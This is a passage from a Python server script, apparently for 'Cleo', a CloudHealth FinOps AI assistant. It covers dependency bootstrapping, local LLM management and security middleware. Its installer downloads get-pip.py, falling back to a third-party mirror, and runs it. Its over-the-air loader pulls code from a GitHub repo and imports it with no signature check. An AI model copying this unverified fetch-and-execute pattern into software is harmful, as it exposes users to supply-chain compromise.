#!/usr/bin/env python3
"""
cleo_server.py — High-Performance GUI & HTTP API Server for Cleo FinOps Agent
================================================================================
Provides a complete, modern Web UI and REST API for Cleo, with native
OAuth 2.0 PKCE handshake support for CloudHealth MCP, detailed verbose logging,
and live diagnostic inspection.
"""
from __future__ import annotations

import sys, os, subprocess, site, shutil
import cleo_logger  # Installs crash-proof stream wrappers, unhandled exception hooks & file logger

# Ensure user and system site/dist-packages are in sys.path (supports macOS, Linux/Ubuntu dist-packages)
for _p in [
    site.getusersitepackages() if hasattr(site, "getusersitepackages") else None,
    os.path.expanduser(f"~/.local/lib/python{sys.version_info[0]}.{sys.version_info[1]}/site-packages"),
    os.path.expanduser(f"~/.local/lib/python{sys.version_info[0]}.{sys.version_info[1]}/dist-packages"),
    f"/usr/local/lib/python{sys.version_info[0]}.{sys.version_info[1]}/dist-packages",
    "/usr/lib/python3/dist-packages",
]:
    if _p and os.path.isdir(_p) and _p not in sys.path:
        sys.path.append(_p)

_base_dir = os.path.dirname(os.path.abspath(__file__))
_venv_dir = os.path.join(_base_dir, ".venv")
_venv_python = os.path.join(_venv_dir, "bin", "python3") if os.name != "nt" else os.path.join(_venv_dir, "Scripts", "python.exe")

def _same_path(p1: str, p2: str) -> bool:
    try:
        return os.path.normcase(os.path.realpath(os.path.abspath(p1))) == os.path.normcase(os.path.realpath(os.path.abspath(p2)))
    except Exception:
        return os.path.normcase(os.path.abspath(p1)) == os.path.normcase(os.path.abspath(p2))

def _is_active_venv() -> bool:
    try:
        return os.path.normcase(os.path.abspath(sys.prefix)) == os.path.normcase(os.path.abspath(_venv_dir))
    except Exception:
        return False

def _can_import_core() -> bool:
    try:
        import fastapi
        import uvicorn
        return True
    except ImportError:
        return False

def _has_pip(py_bin: str = sys.executable) -> bool:
    try:
        subprocess.check_call([py_bin, "-m", "pip", "--version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except Exception:
        return False

def _bootstrap_pip() -> bool:
    print("📥 Bootstrapping pip into user environment (no sudo needed)...")
    import urllib.request, tempfile
    with tempfile.TemporaryDirectory() as tmp_dir:
        get_pip_file = os.path.join(tmp_dir, "get-pip.py")
        download_ok = False
        for url in [
            "https://bootstrap.pypa.io/get-pip.py",
            "https://mirrors.aliyun.com/pypi/get-pip.py",
        ]:
            try:
                def _dl_hook(blocks, block_size, total_size):
                    if total_size > 0:
                        pct = min(100, int(blocks * block_size * 100 / total_size))
                        print(f"\r📥 Downloading get-pip.py: {pct}%", end="", flush=True)
                urllib.request.urlretrieve(url, get_pip_file, reporthook=_dl_hook)
                print("\r📥 Downloading get-pip.py: 100% (done)")
                download_ok = True
                break
            except Exception:
                continue
        if not download_ok:
            return False

        for flags in [
            ["--user", "--break-system-packages"],
            ["--user"],
            ["--break-system-packages"],
            [],
        ]:
            try:
                subprocess.check_call([sys.executable, get_pip_file] + flags, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                _u = site.getusersitepackages() if hasattr(site, "getusersitepackages") else None
                if _u and os.path.isdir(_u) and _u not in sys.path:
                    sys.path.insert(0, _u)
                for _p in [
                    os.path.expanduser(f"~/.local/lib/python{sys.version_info[0]}.{sys.version_info[1]}/site-packages"),
                    os.path.expanduser(f"~/.local/lib/python{sys.version_info[0]}.{sys.version_info[1]}/dist-packages"),
                ]:
                    if _p and os.path.isdir(_p) and _p not in sys.path:
                        sys.path.insert(0, _p)
                import importlib
                importlib.invalidate_caches()
                if _has_pip(sys.executable):
                    print("✅ pip bootstrapped successfully!")
                    return True
            except Exception:
                continue
    return False

def _is_python_ready(py_bin: str) -> bool:
    if not os.path.exists(py_bin):
        return False
    try:
        subprocess.check_call(
            [py_bin, "-c", "import fastapi; import uvicorn"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        return True
    except Exception:
        return False

def _setup_and_activate_venv():
    # 1. Fast path: if the active environment ALREADY has required packages, use it directly!
    if _can_import_core():
        return

    # 2. If running outside .venv, check if .venv is ready or try building/repairing it
    if not _is_active_venv() and os.environ.get("_CLEO_VENV_LAUNCHED") != "1":
        # If .venv is already built and fully ready, switch into it once
        if _is_python_ready(_venv_python):
            if sys.argv and sys.argv[0] != "-c":
                env = os.environ.copy()
                env["_CLEO_VENV_LAUNCHED"] = "1"
                if os.name == "nt":
                    subprocess.check_call([_venv_python] + sys.argv, env=env)
                    sys.exit(0)
                else:
                    os.execve(_venv_python, [_venv_python] + sys.argv, env)
            return

        # Check if existing .venv was created with the same Python version; if not, recreate it
        if os.path.exists(_venv_python):
            try:
                v_ver = subprocess.check_output([_venv_python, "-c", "import sys; print(f'{sys.version_info[0]}.{sys.version_info[1]}')"], text=True).strip()
                s_ver = f"{sys.version_info[0]}.{sys.version_info[1]}"
                if v_ver != s_ver:
                    import shutil
                    shutil.rmtree(_venv_dir, ignore_errors=True)
            except Exception:
                import shutil
                shutil.rmtree(_venv_dir, ignore_errors=True)

        # Check if pip works inside the existing venv
        has_pip = False
        if os.path.exists(_venv_python):
            try:
                subprocess.check_call([_venv_python, "-m", "pip", "--version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                has_pip = True
            except Exception:
                has_pip = False

        if not has_pip:
            # Existing venv is broken or missing pip (e.g. Debian/Ubuntu ensurepip missing).
            # Rebuild cleanly with --without-pip + bootstrap get-pip.py (zero sudo needed!)
            import shutil
            if os.path.exists(_venv_dir):
                shutil.rmtree(_venv_dir, ignore_errors=True)

            print(f"⚙️  Setting up isolated virtual environment in .venv ...")
            venv_ok = False
            try:
                subprocess.check_call([sys.executable, "-m", "venv", _venv_dir], stderr=subprocess.DEVNULL)
                venv_ok = True
            except Exception:
                shutil.rmtree(_venv_dir, ignore_errors=True)
                try:
                    print("ℹ️  Creating virtual environment with --without-pip (no sudo needed)...")
                    subprocess.check_call([sys.executable, "-m", "venv", "--without-pip", _venv_dir])
                    if os.path.exists(_venv_python):
                        print("📥 Bootstrapping pip into .venv ...")
                        import urllib.request
                        get_pip_path = os.path.join(_venv_dir, "get-pip.py")
                        def _dl_hook(blocks, block_size, total_size):
                            if total_size > 0:
                                pct = min(100, int(blocks * block_size * 100 / total_size))
                                print(f"\r📥 Downloading get-pip.py: {pct}%", end="", flush=True)
                        urllib.request.urlretrieve("https://bootstrap.pypa.io/get-pip.py", get_pip_path, reporthook=_dl_hook)
                        print("\r📥 Downloading get-pip.py: 100% (done)")
                        subprocess.check_call([_venv_python, get_pip_path, "--no-warn-script-location"])
                        if os.path.exists(get_pip_path):
                            os.remove(get_pip_path)
                        venv_ok = True
                except Exception as e:
                    print(f"⚠️  Could not auto-create isolated .venv: {e}")

        # Install requirements inside .venv
        if os.path.exists(_venv_python):
            req_file = os.path.join(_base_dir, "requirements.txt")
            cmd = [_venv_python, "-m", "pip", "install", "--disable-pip-version-check"]
            pip_args = ["-r", req_file, "--progress-bar", "on"] if os.path.exists(req_file) else ["fastapi", "uvicorn[standard]", "--progress-bar", "on"]
            
            print(f"📦 Installing required packages from requirements.txt ...")
            venv_install_ok = False
            try:
                subprocess.check_call(cmd + pip_args)
                venv_install_ok = True
            except subprocess.CalledProcessError:
                # Security: never silently fall back to a third-party package index (an unpinned,
                # unhashed install from a mirror is a supply-chain risk). Behind a proxy that blocks
                # PyPI, opt in to a mirror you trust: CLEO_PIP_MIRROR=https://your.mirror/simple
                mirror = os.environ.get("CLEO_PIP_MIRROR", "").strip()
                if mirror.startswith("https://"):
                    try:
                        print(f"⚠️  Direct PyPI download failed. Retrying via CLEO_PIP_MIRROR ({mirror}) ...")
                        subprocess.check_call(cmd + ["--index-url", mirror] + pip_args)
                        venv_install_ok = True
                    except subprocess.CalledProcessError:
                        pass
                else:
                    print("⚠️  Direct PyPI download failed. If a proxy blocks PyPI, set CLEO_PIP_MIRROR=https://<mirror>/simple and retry.")

            if venv_install_ok:
                import platform
                try:
                    if sys.platform == "darwin" and platform.machine() == "arm64":
                        print("🍎 Apple Silicon detected. Auto-installing 'mlx-lm' for local Qwen support...")
                        subprocess.check_call([_venv_python, "-m", "pip", "install", "--disable-pip-version-check", "mlx-lm", "huggingface_hub", "--progress-bar", "on"])
                    elif sys.platform == "win32":
                        print("🪟 Windows detected. Auto-installing 'llama-cpp-python' and 'transformers' for local Qwen support...")
                        subprocess.check_call([_venv_python, "-m", "pip", "install", "--disable-pip-version-check", "huggingface_hub", "transformers", "llama-cpp-python", "--progress-bar", "on"])
                    else:
                        print("🐧 Linux detected. Auto-installing local LLM packages for Qwen support...")
                        print("   ℹ️  Note: Compiling llama-cpp-python may take 1-2 minutes; this is optional for local LLM mode.")
                        subprocess.check_call([_venv_python, "-m", "pip", "install", "--disable-pip-version-check", "huggingface_hub", "transformers", "llama-cpp-python", "--progress-bar", "on"])
                except Exception as e:
                    print(f"⚠️  Note: Could not auto-install optional local LLM packages ({e}). The core server will still start.")

                print("✅ Setup complete! Starting Cleo Server...\n")

            # Relaunch script using the venv python if ready
            if _is_python_ready(_venv_python):
                if sys.argv and sys.argv[0] != "-c":
                    env = os.environ.copy()
                    env["_CLEO_VENV_LAUNCHED"] = "1"
                    if os.name == "nt":
                        subprocess.check_call([_venv_python] + sys.argv, env=env)
                        sys.exit(0)
                    else:
                        os.execve(_venv_python, [_venv_python] + sys.argv, env)
                return

    # 3. Fallback safety: if active environment still lacks core dependencies, install them directly
    if not _can_import_core():
        print("📦 Installing required packages into active environment...")

        # Locate or bootstrap pip
        pip_cmd = None
        if _has_pip(sys.executable):
            pip_cmd = [sys.executable, "-m", "pip"]
        else:
            for candidate in ["pip3", "pip", os.path.expanduser("~/.local/bin/pip3"), os.path.expanduser("~/.local/bin/pip")]:
                which_path = shutil.which(candidate) if not os.path.isabs(candidate) else (candidate if os.path.isfile(candidate) and os.access(candidate, os.X_OK) else None)
                if which_path:
                    try:
                        subprocess.check_call([which_path, "--version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        pip_cmd = [which_path]
                        break
                    except Exception:
                        continue
            if not pip_cmd:
                if _bootstrap_pip():
                    pip_cmd = [sys.executable, "-m", "pip"]
                else:
                    print("\n" + "=" * 70)
                    print("❌ [Cleo Dependency Error] Python pip and venv packages are missing.")
                    print("On Debian/Ubuntu systems, install them using:")
                    print("   sudo apt update && sudo apt install -y python3-pip python3-venv")
                    print("=" * 70 + "\n")
                    sys.exit(1)

        req_file = os.path.join(_base_dir, "requirements.txt")
        pip_args = ["-r", req_file, "--progress-bar", "on"] if os.path.exists(req_file) else ["fastapi", "uvicorn[standard]", "--progress-bar", "on"]
        base_cmd = pip_cmd + ["install", "--disable-pip-version-check"]

        installed_ok = False
        # Try flags: with --break-system-packages for PEP 668 / Homebrew 3.12+, --user for permissions (and CLEO_PIP_MIRROR if the user opted in)
        for extra_flags in [
            ["--break-system-packages"],
            ["--user", "--break-system-packages"],
            [],
            ["--user"],
        ] + (
            # Opt-in only (see CLEO_PIP_MIRROR note above); https index, no --trusted-host
            [[*flags, "--index-url", _m] for _m in [os.environ.get("CLEO_PIP_MIRROR", "").strip()]
             if _m.startswith("https://") for flags in (["--break-system-packages"], ["--user", "--break-system-packages"], [], ["--user"])]
        ):
            try:
                subprocess.check_call(base_cmd + extra_flags + pip_args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                installed_ok = True
                break
            except subprocess.CalledProcessError:
                continue

        if not installed_ok:
            print("\n" + "=" * 70)
            print("❌ [Cleo Dependency Installation Failed]")
            print("Could not install required packages into active Python environment.")
            print("Try running manually:")
            print("   python3 -m pip install --break-system-packages fastapi \"uvicorn[standard]\"")
            print("=" * 70 + "\n")
            sys.exit(1)

        # Refresh sys.path with user site-packages and invalidate caches
        for _p in [
            site.getusersitepackages() if hasattr(site, "getusersitepackages") else None,
            os.path.expanduser(f"~/.local/lib/python{sys.version_info[0]}.{sys.version_info[1]}/site-packages"),
            os.path.expanduser(f"~/.local/lib/python{sys.version_info[0]}.{sys.version_info[1]}/dist-packages"),
        ]:
            if _p and os.path.isdir(_p) and _p not in sys.path:
                sys.path.insert(0, _p)
        import importlib
        importlib.invalidate_caches()

        if not _can_import_core():
            if os.environ.get("_CLEO_FALLBACK_RELAUNCHED") == "1":
                print(f"\n❌ [Cleo Dependency Error] Required packages could not be imported after install.")
                print("Try installing dependencies manually in your Python environment:")
                print("   pip install fastapi \"uvicorn[standard]\"\n")
                sys.exit(1)
            print("🔄 Packages installed. Relaunching Cleo Server...")
            env = os.environ.copy()
            env["_CLEO_FALLBACK_RELAUNCHED"] = "1"
            if os.name == "nt":
                subprocess.check_call([sys.executable] + sys.argv, env=env)
                sys.exit(0)
            else:
                os.execve(sys.executable, [sys.executable] + sys.argv, env)

_setup_and_activate_venv()

# Ensure workspace virtualenv site-packages are immediately accessible across platforms
_cleo_root = os.path.dirname(os.path.abspath(__file__))
_venv_lib = os.path.join(_cleo_root, ".venv", "lib")
if os.path.isdir(_venv_lib):
    for _d in os.listdir(_venv_lib):
        _sp = os.path.join(_venv_lib, _d, "site-packages")
        if os.path.isdir(_sp) and _sp not in sys.path:
            sys.path.insert(0, _sp)
_venv_win = os.path.join(_cleo_root, ".venv", "Lib", "site-packages")
if os.path.isdir(_venv_win) and _venv_win not in sys.path:
    sys.path.insert(0, _venv_win)

import json, uuid, time, argparse, urllib.parse, urllib.request, base64, hashlib, socket, subprocess, platform, shutil, re
from datetime import datetime, timezone
from typing import Optional
from contextlib import asynccontextmanager

# ── Over-The-Air (OTA) Dynamic Code Loader ──────────────────────────────────
# Enables Tauri desktop app and standalone binaries to pull and run the latest
# Python business logic and HTML UI from ~/.cleo/src (or CLEO_DEV_SRC) without
# requiring native rebuilds of the binary.

_cleo_src_dir: Optional[str] = None

def _download_ota_tarball(src_dir: str, repo_slug: str, branch: str):
    """Fallback archive download when git CLI is not installed or network clone failed."""
    import io, tarfile
    try:
        ver_file = os.path.join(src_dir, ".version")
        local_sha = ""
        if os.path.exists(ver_file):
            try:
                with open(ver_file, "r", encoding="utf-8") as f:
                    local_sha = f.read().strip()
            except Exception:
                pass

        api_url = f"https://api.github.com/repos/{repo_slug}/commits/{branch}"
        req = urllib.request.Request(api_url, headers={"Accept": "application/vnd.github+json", "User-Agent": "Cleo-FinOps/2.1"})
        with urllib.request.urlopen(req, timeout=5) as resp:
            data = json.loads(resp.read().decode())
            remote_sha = data.get("sha", "").strip()

        has_py_files = os.path.isdir(src_dir) and any(f.endswith(".py") for f in os.listdir(src_dir))
        if remote_sha and remote_sha == local_sha and has_py_files:
            return

        tar_url = f"https://github.com/{repo_slug}/archive/refs/heads/{branch}.tar.gz"
        req_tar = urllib.request.Request(tar_url, headers={"User-Agent": "Cleo-FinOps/2.1"})
        with urllib.request.urlopen(req_tar, timeout=25) as resp:
            tar_bytes = io.BytesIO(resp.read())

        os.makedirs(src_dir, exist_ok=True)
        with tarfile.open(fileobj=tar_bytes, mode="r:gz") as tar:
            for member in tar.getmembers():
                parts = member.name.split("/", 1)
                if len(parts) > 1 and parts[1]:
                    member.name = parts[1]
                    if hasattr(tarfile, "data_filter"):
                        tar.extract(member, path=src_dir, filter="data")
                    else:
                        tar.extract(member, path=src_dir)

        if remote_sha:
            with open(ver_file, "w", encoding="utf-8") as f:
                f.write(remote_sha + "\n")
    except Exception:
        pass


def _sync_ota_repository(src_dir: str):
    """
    Syncs latest Cleo code from GitHub into src_dir (~/.cleo/src).
    Uses shallow git clone/pull if git is available, otherwise falls back to GitHub archive download.
    Guaranteed not to crash or hang startup if offline.
    """
    repo_slug = os.environ.get("CLEO_GITHUB_REPO", os.environ.get("CLEO_GITLAB_REPO", "digitalsuni-cloud/cleo"))
    branch = os.environ.get("CLEO_GITHUB_BRANCH", os.environ.get("CLEO_GITLAB_BRANCH", "main"))

    if not re.match(r'^[a-zA-Z0-9_\-\.]+/[a-zA-Z0-9_\-\.]+$', repo_slug):
        return

    os.makedirs(os.path.dirname(src_dir), exist_ok=True)
    has_git = shutil.which("git") is not None

    if has_git:
        git_dir = os.path.join(src_dir, ".git")
        if os.path.isdir(git_dir):
            try:
                ls_res = subprocess.run(
                    ["git", "ls-remote", f"https://github.com/{repo_slug}.git", f"refs/heads/{branch}"],
                    capture_output=True, text=True, timeout=5
                )
                if ls_res.returncode == 0 and ls_res.stdout.strip():
                    remote_sha = ls_res.stdout.split()[0].strip()
                    rev_res = subprocess.run(
                        ["git", "rev-parse", "HEAD"],
                        cwd=src_dir, capture_output=True, text=True, timeout=3
                    )
                    local_sha = rev_res.stdout.strip() if rev_res.returncode == 0 else ""
                    if remote_sha and remote_sha != local_sha:
                        print(f"🔄 [OTA Sync] Updating Cleo code from GitHub ({local_sha[:7]} -> {remote_sha[:7]})...")
                        subprocess.run(
                            ["git", "fetch", "--depth", "1", "origin", branch],
                            cwd=src_dir, capture_output=True, timeout=15
                        )
                        subprocess.run(
                            ["git", "reset", "--hard", f"origin/{branch}"],
                            cwd=src_dir, capture_output=True, timeout=10
                        )
                        print(f"🚀 [OTA Sync] Successfully updated to {remote_sha[:7]}!")
                    else:
                        print(f"✅ [OTA Sync] Code in {src_dir} is up-to-date ({local_sha[:7]}).")
            except Exception as e:
                print(f"ℹ️  [OTA Sync] Network check skipped ({e}). Using cached code in {src_dir}.")
        else:
            try:
                print(f"📥 [OTA Sync] Initializing Cleo live code in {src_dir} from GitHub...")
                if os.path.exists(src_dir) and not os.path.isdir(git_dir):
                    shutil.rmtree(src_dir, ignore_errors=True)
                res = subprocess.run(
                    ["git", "clone", "--depth", "1", "-b", branch, f"https://github.com/{repo_slug}.git", src_dir],
                    capture_output=True, text=True, timeout=25
                )
                if res.returncode == 0:
                    print(f"🚀 [OTA Sync] Initial sync completed successfully!")
                else:
                    _download_ota_tarball(src_dir, repo_slug, branch)
            except Exception as e:
                print(f"ℹ️  [OTA Sync] Clone skipped ({e}). Falling back to archive...")
                _download_ota_tarball(src_dir, repo_slug, branch)
    else:
        _download_ota_tarball(src_dir, repo_slug, branch)


def _init_ota_code_loader():
    global _cleo_src_dir
    if os.environ.get("CLEO_NO_OTA", "").lower() in ("1", "true", "yes"):
        return

    dev_src = os.environ.get("CLEO_DEV_SRC")
    is_frozen = getattr(sys, "frozen", False)
    is_ota_sync = os.environ.get("CLEO_OTA_SYNC") == "1" or os.environ.get("CLEO_FORCE_OTA") == "1"

    if dev_src:
        cand_dir = os.path.abspath(os.path.expanduser(dev_src))
        if os.path.isdir(cand_dir) and any(f.endswith(".py") for f in os.listdir(cand_dir)):
            _cleo_src_dir = cand_dir
            print(f"⚡ [OTA Loader] Using local dev source: {_cleo_src_dir}")
    elif is_frozen or is_ota_sync:
        cand_dir = os.path.expanduser("~/.cleo/src")
        _sync_ota_repository(cand_dir)
        if os.path.isdir(cand_dir) and any(f.endswith(".py") for f in os.listdir(cand_dir)):
            agent_file = os.path.join(cand_dir, "cleo_agent.py")
            if os.path.exists(agent_file):
                try:
                    with open(agent_file, "r", encoding="utf-8") as f:
                        compile(f.read(), "cleo_agent.py", "exec")
                    _cleo_src_dir = cand_dir
                    print(f"⚡ [OTA Loader] Cleo running live from: {_cleo_src_dir}")
                except Exception as e:
                    print(f"⚠️  [OTA Loader] Syntax check failed on {agent_file}: {e}. Falling back to bundled code.")

    if _cleo_src_dir:
        if _cleo_src_dir not in sys.path:
            sys.path.insert(0, _cleo_src_dir)
        from importlib.machinery import PathFinder
        if PathFinder in sys.meta_path:
            sys.meta_path.remove(PathFinder)
            sys.meta_path.insert(0, PathFinder)

_init_ota_code_loader()

from fastapi import FastAPI, HTTPException, Request, Response
from starlette.middleware.trustedhost import TrustedHostMiddleware
from html import escape as html_escape
from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse, StreamingResponse, FileResponse
from pydantic import BaseModel, Field
import uvicorn

import atexit
from cleo_logger import get_logger, get_recent_logs
logger = get_logger("server")
import threading
from cleo_crypto import save_encrypted_json, load_encrypted_json, migrate_all_cleo_files

from cleo_agent import (
    MCPClient, AIClient, build_system_prompt, run_agent_turn,
    get_access_token, _load_config, _save_config, AI_ENGINES, auth_helper,
    STANDARD_CH_TOOLS, LOCAL_CLIENT_ID, LOCAL_REDIRECT_URI,
    LOCAL_MODELS, PUBLIC_ENGINES, get_installed_ollama_models, OLLAMA_BASE_URL,
    normalize_ollama_url, get_ollama_opener,
    MLX_MODELS, get_installed_mlx_models, call_mlx_generate, unload_mlx_models, estimate_token_count,
    crawl_and_cache_all_datasource_metadata, split_thinking_and_response,
    detect_system_info, get_cached_datasource_metadata, CURATED_DATASET_SPECS
)

def unload_ollama_models(model_name: Optional[str] = None):
    """Tells local Ollama daemon to immediately evict loaded models from RAM/VRAM."""
    if not _check_ollama_alive():
        return
    opener = get_ollama_opener()
    try:
        targets = []
        if model_name:
            targets.append(model_name.removeprefix("ollama:").strip())
        else:
            try:
                req = urllib.request.Request(f"{OLLAMA_BASE_URL}/api/ps")
                with opener.open(req, timeout=2.0) as resp:
                    data = json.loads(resp.read().decode("utf-8"))
                    for item in data.get("models", []):
                        name = item.get("name") or item.get("model")
                        if name:
                            targets.append(name)
            except urllib.error.HTTPError as he:
                if he.code == 404:
                    logger.debug("[Ollama Unload] /api/ps returned 404 (no running models or older Ollama version).")
                else:
                    logger.debug(f"[Ollama Unload] /api/ps returned HTTP {he.code}: {he}")
            except Exception as pe:
                logger.debug(f"[Ollama Unload] /api/ps check skipped: {pe}")

        for m in targets:
            try:
                logger.info(f"🧹 [Ollama Unload] Evicting model '{m}' from VRAM/RAM...")
                payload = json.dumps({"model": m, "keep_alive": 0}).encode("utf-8")
                req = urllib.request.Request(
                    f"{OLLAMA_BASE_URL}/api/generate",
                    data=payload,
                    headers={"Content-Type": "application/json"}
                )
                with opener.open(req, timeout=3.0) as resp:
                    pass
                logger.info(f"✅ [Ollama Unload] Model '{m}' evicted from memory.")
                sys.stdout.flush()
            except urllib.error.HTTPError as he:
                if he.code == 404:
                    logger.debug(f"[Ollama Unload] Model '{m}' is not currently loaded in Ollama (404 Not Found).")
                else:
                    logger.warning(f"Could not evict Ollama model '{m}': {he}")
            except Exception as me:
                logger.debug(f"[Ollama Unload] Error evicting '{m}': {me}")
    except Exception as e:
        logger.debug(f"Could not evict Ollama models: {e}")

def _on_process_shutdown():
    try:
        unload_mlx_models()
        unload_ollama_models()
    except Exception:
        pass

atexit.register(_on_process_shutdown)

# ── Idle LLM unload watchdog ──────────────────────────────────────────────────
# Unload local model from memory after 60s of inactivity; reload happens
# automatically on the next chat request via lazy-load in call_mlx_generate.
# Tier 2.5: Adaptive — if a chat is in progress or last activity was <30s ago,
# skip unload to avoid cold-start penalty mid-conversation.
_last_activity: float = 0.0
_IDLE_UNLOAD_SECS = 60  # reduced from 75s for faster memory reclaim
_ACTIVE_GRACE_SECS = 30  # keep warm if activity within last 30s
_active_chats_count: int = 0

def _idle_watchdog():
    while True:
        time.sleep(10)  # check every 10s (was 15s) for snappier reclaim
        global _active_chats_count
        if _active_chats_count > 0:
            continue
        if not _last_activity:
            continue
        idle_secs = time.time() - _last_activity
        if idle_secs < _ACTIVE_GRACE_SECS:
            continue  # recent activity — keep model warm
        if idle_secs > _IDLE_UNLOAD_SECS:
            try:
                from cleo_agent import _mlx_models_cache
                if _mlx_models_cache:
                    logger.info(f"💤 [Idle Watchdog] No activity for {idle_secs:.0f}s — unloading local LLM from memory.")
                    sys.stdout.flush()
                    unload_mlx_models()
                    unload_ollama_models()
            except Exception as e:
                logger.debug(f"[Idle Watchdog] {e}")

threading.Thread(target=_idle_watchdog, daemon=True, name="idle-unload-watchdog").start()

def _start_tauri_parent_watchdog():
    tauri_pid_str = os.environ.get("CLEO_TAURI_PID", "").strip()
    if not tauri_pid_str:
        return
    try:
        tauri_pid = int(tauri_pid_str)
    except ValueError:
        return

    def _is_pid_alive(pid: int) -> bool:
        if pid <= 0:
            return False
        if sys.platform == "win32":
            try:
                import ctypes
                kernel32 = ctypes.windll.kernel32
                handle = kernel32.OpenProcess(0x1000, False, pid)  # PROCESS_QUERY_LIMITED_INFORMATION
                if not handle:
                    return False
                exit_code = ctypes.c_ulong()
                alive = kernel32.GetExitCodeProcess(handle, ctypes.byref(exit_code))
                kernel32.CloseHandle(handle)
                return alive != 0 and exit_code.value == 259  # STILL_ACTIVE = 259
            except Exception:
                return False
        else:
            try:
                os.kill(pid, 0)
                return True
            except OSError:
                return False

    def _watchdog_loop():
        logger.info(f"👀 [Watchdog] Monitoring Tauri parent process (PID {tauri_pid})...")
        while True:
            time.sleep(1.0)
            if not _is_pid_alive(tauri_pid):
                logger.info(f"🛑 [Watchdog] Parent Tauri process {tauri_pid} exited. Stopping Cleo server...")
                try:
                    unload_mlx_models()
                    unload_ollama_models()
                except Exception:
                    pass
                os._exit(0)

    threading.Thread(target=_watchdog_loop, daemon=True, name="tauri-parent-watchdog").start()

_start_tauri_parent_watchdog()


@asynccontextmanager
async def lifespan(app: FastAPI):
    try:
        migrated = migrate_all_cleo_files()
        if migrated > 0:
            logger.info(f"🔒 Migrated {migrated} data files to AES-256-GCM encryption.")
    except Exception as e:
        logger.debug(f"Encryption migration check: {e}")
    if init_mcp_if_authenticated():
        logger.info(f"✅ CloudHealth Connection Ready ({len(_tools)} tools available)")
    else:
        logger.info("ℹ️ CloudHealth authentication needed (use Web GUI to connect)")
    yield
    # Server shutdown: evict any loaded local models and close MCP
    logger.info("🛑 Cleo server shutting down. Releasing local LLM models from memory...")
    if _mcp:
        try:
            _mcp.close()
        except Exception:
            pass
    unload_mlx_models()
    unload_ollama_models()

app = FastAPI(
    title="Cleo — CloudHealth FinOps AI",
    description="Intelligent FinOps Assistant powered by CloudHealth MCP",
    version="2.1.0",
    lifespan=lifespan,
)

# Security: no CORS. The UI is served same-origin, and the desktop app (Tauri) loads the dashboard
# natively rather than fetching the API from its splash page, so no origin needs cross-origin access.
# (A wildcard policy previously let any web page read every API response.)
# TrustedHostMiddleware rejects requests whose Host header isn't loopback, which also blocks
# DNS-rebinding (attacker domain resolving to 127.0.0.1).
# Extra hostnames (e.g. a reverse proxy) can be added via CLEO_ALLOWED_HOSTS=a.example,b.example
app.add_middleware(
    TrustedHostMiddleware,
    allowed_hosts=["127.0.0.1", "localhost", "[::1]", "testserver"]
    + [h.strip() for h in os.environ.get("CLEO_ALLOWED_HOSTS", "").split(",") if h.strip()],
)

# Check for saved engine preference first
_cfg_init = _load_config()
_saved_engine = _cfg_init.get("AI_ENGINE")
if _saved_engine and (_saved_engine in AI_ENGINES or _saved_engine.startswith("mlx:") or _saved_engine.startswith("ollama:") or _saved_engine in ("gemini", "openai", "anthropic", "direct")):
    _init_engine_key = _saved_engine
    if _saved_engine in AI_ENGINES:
        _init_engine_label = AI_ENGINES[_saved_engine][0]
    elif _saved_engine.startswith("ollama:"):
        _init_engine_label = f"Ollama ({_saved_engine.split(':', 1)[1]})"
    elif _saved_engine.startswith("mlx:"):
        _init_engine_label = f"{_saved_engine.removeprefix('mlx:').split('/')[-1]} (MLX)"
    else:
        _init_engine_label = _saved_engine
else:
    # Check for local MLX models on Apple Silicon
    _init_mlx = get_installed_mlx_models()
    _ready_mlx = {m["repo_id"]: m for m in _init_mlx if m.get("downloaded")}
    if "mlx-community/Qwen3.5-9B-MLX-4bit" in _ready_mlx:
        _init_engine_key = "mlx:mlx-community/Qwen3.5-9B-MLX-4bit"
        _init_engine_label = "Qwen3.5-9B-4bit (MLX Default)"
    elif "mlx-community/Qwen2.5-7B-Instruct-4bit" in _ready_mlx:
        _init_engine_key = "mlx:mlx-community/Qwen2.5-7B-Instruct-4bit"
        _init_engine_label = "Qwen2.5-7B-Instruct-4bit (MLX Default)"
    elif _ready_mlx:
        first_repo = list(_ready_mlx.keys())[0]
        _init_engine_key = f"mlx:{first_repo}"
        _init_engine_label = f"{first_repo.split('/')[-1]} (MLX)"
    else:
        # Linux / Non-MLX environment: prefer installed Ollama models
        installed_ollama = [m.get("name", "") for m in get_installed_ollama_models()]
        if any("qwen2.5:7b" in n for n in installed_ollama):
            _init_engine_key = "ollama:qwen2.5:7b"
            _init_engine_label = "Qwen2.5-7B-Instruct-4bit (Ollama)"
        elif any("qwen2.5:3b" in n for n in installed_ollama):
            _init_engine_key = "ollama:qwen2.5:3b"
            _init_engine_label = "Qwen2.5-3B-Instruct-4bit (Ollama)"
        elif any("Qwen3.5-9B" in n for n in installed_ollama):
            match = next(n for n in installed_ollama if "Qwen3.5-9B" in n)
            _init_engine_key = f"ollama:{match}"
            _init_engine_label = "Qwen3.5-9B-4bit (Ollama)"
        elif any("Qwen3.5-4B" in n for n in installed_ollama):
            match = next(n for n in installed_ollama if "Qwen3.5-4B" in n)
            _init_engine_key = f"ollama:{match}"
            _init_engine_label = "Qwen3.5-4B-4bit (Ollama)"
        elif installed_ollama:
            _init_engine_key = f"ollama:{installed_ollama[0]}"
            _init_engine_label = f"{installed_ollama[0]} (Ollama)"
        else:
            _init_engine_key = "ollama:qwen2.5:7b"
            _init_engine_label = "Qwen2.5-7B-Instruct-4bit (Ollama)"

# Global runtime state
_mcp: Optional[MCPClient] = None
_ai:  Optional[AIClient]  = None
_tools: list[dict]     = []

SESSIONS_CACHE_FILE = os.environ.get("CLEO_SESSIONS_FILE", os.path.expanduser("~/.cleo/sessions.json"))
MAX_SAVED_SESSIONS = 100

def _generate_chat_title(prompt: str) -> str:
    p = (prompt or "").strip()
    if not p:
        return "New Conversation"
    prefixes = [
        "what are the ", "what is the ", "what's the ", "what's my ", "what is my ",
        "show our ", "show me the ", "show me ", "show ", "can you ", "please ",
        "get the ", "get ", "list all ", "list ", "tell me about ", "tell me ",
        "try listing the ", "try listing ", "find ", "check "
    ]
    p_lower = p.lower()
    for prefix in prefixes:
        if p_lower.startswith(prefix):
            p = p[len(prefix):].strip()
